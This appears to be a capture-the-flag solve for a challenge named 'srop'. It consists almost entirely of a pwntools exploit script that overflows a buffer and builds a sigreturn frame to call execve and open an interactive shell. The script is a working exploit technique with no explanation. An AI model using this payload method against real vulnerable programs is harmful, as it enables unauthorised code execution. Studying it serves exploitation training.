# Sigreturn-Oriented-Programming-SROP-

# Solve

```py
from pwn import *

elf = context.binary = ELF('srop')
io = process()
#io = remote('chall.ycfteam.in','2222')

pop_rax = pack(0x0000000000401144)
syscall = pack(0x0000000000401129)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x404035  # bin/bash
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x0000000000401129  # syscall

payload = cyclic(8)+ pop_rax + pack(15) + syscall + bytes(frame)
io.sendline(payload)

io.interactive()
```
